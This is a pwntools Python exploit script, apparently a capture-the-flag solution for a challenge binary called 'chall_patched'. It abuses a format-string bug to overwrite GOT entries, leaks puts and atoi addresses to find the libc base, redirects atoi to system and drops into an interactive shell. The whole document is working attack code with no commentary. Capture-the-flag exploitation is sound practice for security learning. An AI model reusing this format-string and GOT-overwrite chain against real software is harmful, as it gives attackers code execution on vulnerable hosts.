from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
b *0x00000000004009d7
c
c
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './chall_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()

libc = ELF('./libc.so.6', checksec=False)

main = elf.sym['main']
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']

log.info("main address: " + hex(main))
log.info("pow GOT address: " + hex(puts_got))
log.info("atoi_got GOT address: " + hex(atoi_got))
log.info("elf.got[pow] address: " + hex(elf.got["pow"]))

a1 , a2 = fmtstr_split(13, {elf.got["pow"]: elf.sym["main"]}, numbwritten = 58)
log.info(b"a2: " + a2)

payload1 = b'1_______' + p64(puts_got) + p64(atoi_got) + a2
payload2 = b'1_______%11$s%12$s' + a1

log.info(f'Payload 1: {payload1}')
log.info(f'Payload 1 size: {len(payload1)}')
log.info(f'Payload 2: {payload2}')
log.info(f'Payload 2 size: {len(payload2)}')

io.recvuntil('A: ')
io.sendline(payload1)

io.recvuntil('B: ')
io.sendline(payload2)

io.recvuntil(b'B: 1_______')

puts_addr = unpack(io.recv(6).ljust(8,b'\x00'))
log.info(f'puts : {hex(puts_addr)}')
atoi_addr = unpack(io.recv(6).ljust(8,b'\x00'))
log.info(f'atoi : {hex(atoi_addr)}')
libc.address = puts_addr - libc.symbols["puts"]
log.info(f"LibC base address: {hex(libc.address)}")

a1 , a2 = fmtstr_split(11, {elf.got["atoi"]: libc.sym["system"]}, numbwritten=46)

payload1 = b'1_______' + a2
payload2 = b'1_______' + a1

log.info(f'Payload 1: {payload1}')
log.info(f'Payload 1 size: {len(payload1)}')
log.info(f'Payload 2: {payload2}')
log.info(f'Payload 2 size: {len(payload2)}')

io.recvuntil('A: ')
io.sendline(payload1)
io.recvuntil('B: ')
io.sendline(payload2)

print(io.recvline())

io.interactive()


'''
read arg = 10
'''